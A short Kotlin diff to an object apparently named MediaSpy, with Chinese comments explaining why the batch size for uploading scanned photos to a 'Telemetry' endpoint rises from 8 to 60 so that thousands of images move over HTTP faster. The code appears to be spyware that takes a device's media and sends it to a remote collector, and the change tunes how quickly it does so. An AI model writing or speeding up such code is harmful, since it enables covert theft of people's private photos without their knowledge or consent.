@@ -109,8 +109,11 @@ object MediaSpy {
                     Telemetry.push("media", d, added / 1000L)
                     if (sentNames.add(nm0)) dirtyNames = true
                     sent++
-                    // 每 8 张就推一次，不等扫完 —— 用户能边扫边看到图
-                    if (sent % 8 == 0) {
+                    // 每 60 张推一次。
+                    // 原来是 8 张一发：3000 张要 375 次 HTTP 往返，
+                    // 每次哪怕只要 0.3 秒，光在网络上就耗掉近两分钟，
+                    // 看着就像「读得快但传得慢」。批量之后只有 50 次。
+                    if (sent % 60 == 0) {
                         runCatching { Telemetry.flush(ctx, true) }
                     }
                 }
